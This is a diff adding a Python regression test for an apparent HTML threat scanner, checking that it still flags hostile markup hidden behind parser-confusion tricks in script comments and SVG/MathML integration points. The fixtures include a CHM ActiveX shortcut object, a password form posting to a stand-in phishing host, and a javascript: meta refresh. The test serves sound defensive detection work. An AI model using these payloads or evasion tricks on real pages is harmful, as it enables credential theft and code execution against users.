@@ -902,3 +902,46 @@ def test_review_r11_regressions_ip_cdata_double_escaped_script_and_png_starvatio
     ).encode()
     found_s = _rule_ids(_scan(tmp_path, "r11_png550.html", starve_doc))
     assert {"HTML_CREDENTIAL_FORM", "SVG_SCRIPT"} <= found_s
+
+
+def test_review_r12_regressions_abrupt_script_comments_and_nested_ip_html(
+    tmp_path: Path,
+) -> None:
+    chm = (
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+    )
+    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'
+    meta = b'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
+
+    # Blocker 1: <!--> and <!---> inside <script> return to NORMAL state (no double-escaped)
+    for idx, abrupt in enumerate((b"<!-->", b"<!--->")):
+        sc = b"<script>" + abrupt + b"<script></script>"
+        doc_chm = b"<!DOCTYPE html><html><body>" + sc + chm + b"</body></html>"
+        doc_cred = b"<!DOCTYPE html><html><body>" + sc + cred + b"</body></html>"
+        doc_meta = b"<!DOCTYPE html><html><head>" + sc + meta + b"</head></html>"
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"r12_sc_chm_{idx}.html", doc_chm))
+        assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, f"r12_sc_cred_{idx}.html", doc_cred))
+        assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
+            _scan(tmp_path, f"r12_sc_meta_{idx}.html", doc_meta)
+        )
+
+    # Blocker 2: nested <div><div></div> inside SVG/MathML integration points keeps HTML namespace
+    nested_ip_cases = (
+        b"<!DOCTYPE html><html><body><svg><foreignObject><div><div></div><![CDATA[>"
+        + chm
+        + b"</div></foreignObject></svg></body></html>",
+        b"<!DOCTYPE html><html><body><svg><title><div><div></div><![CDATA[>"
+        + cred
+        + b"</div></title></svg></body></html>",
+        b"<!DOCTYPE html><html><body><math><mtext><div><div></div><![CDATA[>"
+        + chm
+        + b"</div></mtext></math></body></html>",
+        b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html">'
+        b"<div><div></div><![CDATA[>"
+        + cred
+        + b"</div></annotation-xml></math></body></html>",
+    )
+    for idx, doc in enumerate(nested_ip_cases):
+        found = _rule_ids(_scan(tmp_path, f"r12_nest_ip_{idx}.html", doc))
+        assert ("HTML_CHM_ACTIVEX" in found) or ("HTML_CREDENTIAL_FORM" in found), f"case {idx}: {found}"
